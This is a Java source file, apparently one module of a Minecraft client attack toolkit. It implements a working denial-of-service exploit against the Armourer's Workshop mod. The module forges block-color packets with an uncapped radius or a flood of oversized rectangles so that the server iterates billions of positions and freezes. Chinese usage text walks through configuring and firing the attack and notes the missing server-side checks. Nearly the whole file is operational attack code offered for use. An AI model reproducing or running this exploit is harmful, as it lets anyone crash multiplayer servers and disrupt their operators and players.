package com.redblue.red.modules.armourersworkshop;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.core.GlobalPos;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.world.phys.Vec3;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * AW01: UpdateBlockColorPacket (ID 128) DoS via CubeSelector
 *
 * Two attack vectors:
 * 1. RADIUS mode (SAME): radius read as raw readInt() with no cap.
 *    Server iterates (2*radius-1)^3 positions in one tick.
 * 2. RECT_FLOOD mode (ALL): unbounded rect count + rect dimensions.
 *    Server iterates width*height*depth per rect -> OOM/CPU exhaustion.
 *
 * No distance check, no dimension check, no held-item check on server.
 */
public class AW01_BlockColorDoS implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("armourers_workshop", "aw-channel");
    private static final int PACKET_ID = 128;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "我了解这可能导致服务器崩溃", false),
        ConfigParam.ofEnum("mode", "攻击模式", "RADIUS", "RADIUS", "RECT_FLOOD"),
        ConfigParam.ofInt("radius", "半径 (SAME模式)", 999999, 1, 2000000000)
                .visibleWhen("mode", "RADIUS"),
        ConfigParam.ofInt("rect_count", "矩形数量 (ALL模式)", 100000, 1, 2000000000)
                .visibleWhen("mode", "RECT_FLOOD"),
        ConfigParam.ofInt("rect_size", "矩形尺寸大小", 1000000, 1, 2000000000)
                .visibleWhen("mode", "RECT_FLOOD"),
        ConfigParam.ofInt("packet_count", "发送数据包数量", 1, 1, 10),
        ConfigParam.ofBlock("target_block", "目标方块")
    );

    @Override public String id() { return "aw01_block_color_dos"; }
    @Override public String name() { return "方块染色DoS"; }
    @Override public String description() {
        return "大量发送染色包造成服务端卡顿";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 瞄准目标方块或手动设置目标方块坐标\n"
            + "2. 选择攻击模式: RADIUS(半径模式)或 RECT_FLOOD(矩形洪泛模式)\n"
            + "3. 配置对应模式的参数\n"
            + "4. 勾选危险确认后点击执行\n\n"
            + "[参数说明]\n"
            + "半径: RADIUS模式下的迭代半径，值越大服务端压力越大\n"
            + "矩形数量/尺寸: RECT_FLOOD模式下的矩形数组参数\n"
            + "发送数据包数量: 单次执行发送的数据包数\n\n"
            + "[注意事项]\n"
            + "服务端无物品、距离、维度校验。\n"
            + "单个大半径数据包即可导致服务端冻结。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("armourers_workshop");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        String mode = getParam("mode").map(ConfigParam::getString).orElse("RADIUS");
        int packetCount = getParam("packet_count").map(ConfigParam::getInt).orElse(1);
        BlockPos targetPos = getTargetPos(mc);

        for (int i = 0; i < packetCount; i++) {
            if ("RADIUS".equals(mode)) {
                sendRadiusAttack(mc, targetPos);
            } else {
                sendRectFloodAttack(mc, targetPos);
            }
        }
    }

    private BlockPos getTargetPos(Minecraft mc) {
        long blockLong = getParam("target_block").map(ConfigParam::getLong).orElse(0L);
        if (blockLong != 0) return BlockPos.of(blockLong);
        return mc.player.blockPosition();
    }

    private void sendRadiusAttack(Minecraft mc, BlockPos pos) {
        int radius = getParam("radius").map(ConfigParam::getInt).orElse(999999);
        GlobalPos gpos = GlobalPos.of(mc.level.dimension(), pos);
        BlockHitResult hit = new BlockHitResult(
                Vec3.atCenterOf(pos), Direction.UP, pos, false);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(PACKET_ID);
            // UpdateBlockColorPacket.encode:
            buf.writeEnum(InteractionHand.MAIN_HAND);
            buf.writeGlobalPos(gpos);
            buf.writeBlockHitResult(hit);
            // CubePaintingEvent.encode -> CubeSelector.encode:
            buf.writeBlockPos(pos);
            buf.writeEnum(MatchMode.SAME);       // ordinal 1
            buf.writeInt(radius);
            buf.writeBoolean(true);               // isApplyAllFaces
            buf.writeBoolean(false);              // isPlaneOnly
            // Action: CLEAR_COLOR (ordinal 5), empty encode
            buf.writeEnum(ActionType.CLEAR_COLOR);
            // overrides terminator
            buf.writeByte(0);
        });
    }

    private void sendRectFloodAttack(Minecraft mc, BlockPos pos) {
        int rectCount = getParam("rect_count").map(ConfigParam::getInt).orElse(100000);
        int rectSize = getParam("rect_size").map(ConfigParam::getInt).orElse(1000000);
        GlobalPos gpos = GlobalPos.of(mc.level.dimension(), pos);
        BlockHitResult hit = new BlockHitResult(
                Vec3.atCenterOf(pos), Direction.UP, pos, false);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(PACKET_ID);
            buf.writeEnum(InteractionHand.MAIN_HAND);
            buf.writeGlobalPos(gpos);
            buf.writeBlockHitResult(hit);
            // CubeSelector: mode=ALL
            buf.writeBlockPos(pos);
            buf.writeEnum(MatchMode.ALL);         // ordinal 0
            buf.writeInt(0);                      // radius (unused)
            buf.writeBoolean(true);
            buf.writeBoolean(false);
            // rect array
            buf.writeInt(rectCount);
            for (int i = 0; i < rectCount; i++) {
                buf.writeInt(0); buf.writeInt(0); buf.writeInt(0);
                buf.writeInt(rectSize); buf.writeInt(rectSize); buf.writeInt(rectSize);
            }
            // Action: CLEAR_COLOR
            buf.writeEnum(ActionType.CLEAR_COLOR);
            buf.writeByte(0);
        });
    }

    /** Mirror of CubeSelector.MatchMode ordinals */
    private enum MatchMode { ALL, SAME, TOUCHING }

    /** Mirror of CubePaintingEvent.ActionTypes ordinals */
    private enum ActionType { SET_COLOR, SET_BRIGHTNESS, SET_NOISE, SET_HUE, SET_BLENDING, CLEAR_COLOR }
}
